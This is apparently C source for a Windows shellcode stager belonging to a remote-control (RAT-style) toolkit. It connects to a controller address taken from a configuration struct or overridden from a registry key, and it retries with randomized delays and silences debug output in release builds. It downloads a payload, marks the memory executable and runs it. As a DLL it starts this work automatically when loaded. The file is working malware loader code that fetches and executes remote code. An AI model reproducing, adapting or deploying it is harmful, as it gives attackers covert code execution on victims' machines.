#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <time.h>
#include <assert.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include "../common/hash.h"

#ifdef _DEBUG
#define Mprintf printf
#define IsRelease 0
#else
#define Mprintf(format, ...) 
#define IsRelease 1
#endif

#pragma comment(lib, "ws2_32.lib")

#pragma pack(push, 4)
typedef struct PkgHeader {
	char flag[8];
	int totalLen;
	int originLen;
} PkgHeader;

struct CONNECT_ADDRESS
{
	char	        szFlag[32];		 // 标识
	char			szServerIP[100]; // 主控IP
	char			szPort[8];		 // 主控端口
	int				iType;			 // 客户端类型
	bool            bEncrypt;		 // 上线信息是否加密
	char            szBuildDate[12]; // 构建日期(版本)
	int             iMultiOpen;		 // 支持打开多个
	int				iStartup;		 // 启动方式
	int				iHeaderEnc;		 // 数据加密类型
	char			protoType;		 // 协议类型
	char			runningType;	 // 运行方式
	char            szReserved[44];  // 占位，使结构体占据300字节
	uint64_t		parentHwnd;		 // 父进程窗口句柄
	uint64_t		superAdmin;		 // 管理员主控ID
	char			pwdHash[64];	 // 密码哈希
}g_Server = { "Hello, World!", "127.0.0.1", "6543" };
#pragma pack(pop)

typedef struct PluginParam {
	char IP[100];
	int Port;
	void* Exit;
	void* User;
}PluginParam;

PkgHeader MakePkgHeader(int originLen) {
	PkgHeader header = { 0 };
	memcpy(header.flag, "Hello?", 6);
	header.originLen = originLen;
	header.totalLen = sizeof(PkgHeader) + originLen;
	return header;
}

int GetIPAddress(const char* hostName, char* outIpBuffer, int bufferSize)
{
	struct sockaddr_in sa = {0};
	if (inet_pton(AF_INET, hostName, &(sa.sin_addr)) == 1) {
		strncpy(outIpBuffer, hostName, bufferSize - 1);
		outIpBuffer[bufferSize - 1] = '\0';
		return 0;
	}

	struct addrinfo hints = {0};
	struct addrinfo* res = NULL;
	hints.ai_family = AF_INET;  // IPv4 only
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	if (getaddrinfo(hostName, NULL, &hints, &res) != 0 || res == NULL) {
		return -1;
	}

	struct sockaddr_in* ipv4 = (struct sockaddr_in*)res->ai_addr;
	if (inet_ntop(AF_INET, &(ipv4->sin_addr), outIpBuffer, bufferSize) == NULL) {
		freeaddrinfo(res);
		return -2;
	}

	freeaddrinfo(res);
	return 0;
}

char* ReadRegistryString(const char* subKey, const char* valueName) {
	HKEY hKey = NULL;
	LONG ret = RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey);
	if (ret != ERROR_SUCCESS) 
		return NULL;

	DWORD dataType = 0;
	DWORD dataSize = 1024;
	char *data = (char*)malloc(dataSize+1);
	if (data) {
		ret = RegQueryValueExA(hKey, valueName, NULL, &dataType, (LPBYTE)data, &dataSize);
		data[min(dataSize, 1024)] = '\0';
		if (ret != ERROR_SUCCESS || (dataType != REG_SZ && dataType != REG_EXPAND_SZ)) {
			free(data);
			data = NULL;
		}
	}
	RegCloseKey(hKey);

	return data;
}

const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut) {
	if (!sIP || !sizeOut) return NULL;

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return NULL;

	char addr[100] = { 0 };
	strcpy(addr, sIP);
	const char* path = "Software\\ServerD11\\settings";
	char* saved_ip = ReadRegistryString(path, "master");
	char* saved_port = ReadRegistryString(path, "port");
	char* valid_to = ReadRegistryString(path, "valid_to");
	int now = time(NULL), valid = valid_to ? atoi(valid_to) : 0;
	if (now <= valid && saved_ip && *saved_ip && saved_port && *saved_port) {
		strcpy(addr, saved_ip);
		serverPort = atoi(saved_port);
	}
	free(saved_ip); saved_ip = NULL;
	free(saved_port); saved_port = NULL;
	free(valid_to); valid_to = NULL;

	char serverIP[INET_ADDRSTRLEN] = { 0 };
	if (GetIPAddress(addr, serverIP, sizeof(serverIP)) == 0) {
		Mprintf("Resolved IP: %s\n", serverIP);
	} else {
		Mprintf("Failed to resolve '%s'.\n", addr);
		WSACleanup();
		return NULL;
	}

	srand(time(NULL));
	const int bufSize = (8 * 1024 * 1024);
	char* buffer = NULL;
	BOOL isFirstConnect = TRUE;
	int attemptCount = 0, requestCount = 0;
	do {
		if (!isFirstConnect)
			Sleep(IsRelease ? rand()%120 * 1000 : 5000);
		isFirstConnect = FALSE;
		if (++attemptCount == 20)
			PostMessage((HWND)g_Server.parentHwnd, 4046, (WPARAM)933711587, (LPARAM)1643138518);
		Mprintf("Connecting attempt #%d -> %s:%d \n", attemptCount, serverIP, serverPort);

		SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (clientSocket == INVALID_SOCKET)
			continue;

		DWORD timeout = 30000;
		setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

		struct sockaddr_in serverAddr = { 0 };
		serverAddr.sin_family = AF_INET;
		serverAddr.sin_port = htons(serverPort);
		serverAddr.sin_addr.s_addr = inet_addr(serverIP);
		if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
			closesocket(clientSocket);
			SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
			continue;
		}

		char command[4] = { 210, sizeof(void*) == 8, 0, IsRelease };
		char req[sizeof(PkgHeader) + sizeof(command)] = { 0 };
		PkgHeader h = MakePkgHeader(sizeof(command));
		memcpy(req, &h, sizeof(PkgHeader));
		memcpy(req + sizeof(PkgHeader), command, sizeof(command));
		int bytesSent = send(clientSocket, req, sizeof(req), 0);
		if (bytesSent != sizeof(req)) {
			closesocket(clientSocket);
			continue;
		}

		int totalReceived = 0;
		buffer = buffer ? buffer : (char*)malloc(bufSize);
		if (!buffer) {
			closesocket(clientSocket);
			continue;
		}
		if (requestCount < 3) {
			requestCount++;
			const int bufferSize = 16 * 1024;
			time_t tm = time(NULL);
			while (totalReceived < bufSize) {
				int bytesToReceive = (bufferSize < bufSize - totalReceived) ? bufferSize : (bufSize - totalReceived);
				int bytesReceived = recv(clientSocket, buffer + totalReceived, bytesToReceive, 0);
				if (bytesReceived <= 0) {
					Mprintf("recv failed: WSAGetLastError = %d\n", WSAGetLastError());
					break;
				}
				totalReceived += bytesReceived;
				if (totalReceived >= sizeof(PkgHeader) && totalReceived >= ((PkgHeader*)buffer)->totalLen) {
					Mprintf("recv succeed: Cost time = %d s\n", (int)(time(NULL) - tm));
					break;
				}
			}
		} else {
			closesocket(clientSocket);
			break;
		}

		PkgHeader* header = (PkgHeader*)buffer;
		if (totalReceived != header->totalLen || header->originLen <= 6 || header->totalLen > bufSize) {
			Mprintf("Packet too short or too large: totalReceived = %d\n", totalReceived);
			closesocket(clientSocket);
			continue;
		}
		unsigned char* ptr = buffer + sizeof(PkgHeader);
		int size = 0;
		BYTE cmd = ptr[0], type = ptr[1];
		memcpy(&size, ptr + 2, sizeof(int));
		*sizeOut = size;
		if (cmd != 211 || (type != 0 && type != 1) || size <= 64 || size > bufSize) {
			closesocket(clientSocket);
			break;
		}
		closesocket(clientSocket);
		WSACleanup();
		return buffer;
	} while (1);

	free(buffer);
	WSACleanup();
	return NULL;
}

inline int MemoryFind(const char* szBuffer, const char* Key, int iBufferSize, int iKeySize)
{
	for (int i = 0; i < iBufferSize - iKeySize; ++i){
		if (0 == memcmp(szBuffer + i, Key, iKeySize)){
			return i;
		}
	}
	return -1;
}

#ifdef _WINDLL
#define DLL_API __declspec(dllexport)
#else 
#define DLL_API
#endif

extern DLL_API DWORD WINAPI run(LPVOID param) {
	char eventName[64] = { 0 };
	sprintf(eventName, "EVENT_%d", GetCurrentProcessId());
	HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, eventName);
	PluginParam* info = (PluginParam*)param;
	int size = 0;
	const char* dllData = ReceiveShellcode(info->IP, info->Port, &size);
	if (dllData == NULL) return -1;
	void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (NULL == execMem) return -2;
	int offset = MemoryFind(dllData, MASTER_HASH, size, sizeof(MASTER_HASH)-1);
	if (offset != -1) {
		memcpy(dllData + offset, info->User, 64);
	}
	memcpy(execMem, dllData + 22, size);
	free((void*)dllData);
	DWORD oldProtect = 0;
	if (!VirtualProtect(execMem, size, PAGE_EXECUTE_READ, &oldProtect)) return -3;
	PostMessage((HWND)g_Server.parentHwnd, 4046, (WPARAM)0, (LPARAM)0);
	((void(*)())execMem)();
	return 0;
}

#ifndef _WINDLL

int main() {
	assert(sizeof(struct CONNECT_ADDRESS) == 300);
	PluginParam param = { 0 };
	strcpy(param.IP, g_Server.szServerIP);
	param.Port = atoi(g_Server.szPort);
	param.User = g_Server.pwdHash;
	DWORD result = run(&param);
	Sleep(INFINITE);
	return result;
}

#else

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	static HANDLE threadHandle = NULL;
	if (fdwReason == DLL_PROCESS_ATTACH){
		static PluginParam param = { 0 };
		strcpy(param.IP, g_Server.szServerIP);
		param.Port = atoi(g_Server.szPort);
		param.User = g_Server.pwdHash;
		threadHandle = CreateThread(NULL, 0, run, &param, 0, NULL);
	} else if (fdwReason == DLL_PROCESS_DETACH) {
		if (threadHandle) TerminateThread(threadHandle, 0x20250619);
	}
	return TRUE;
}

#endif
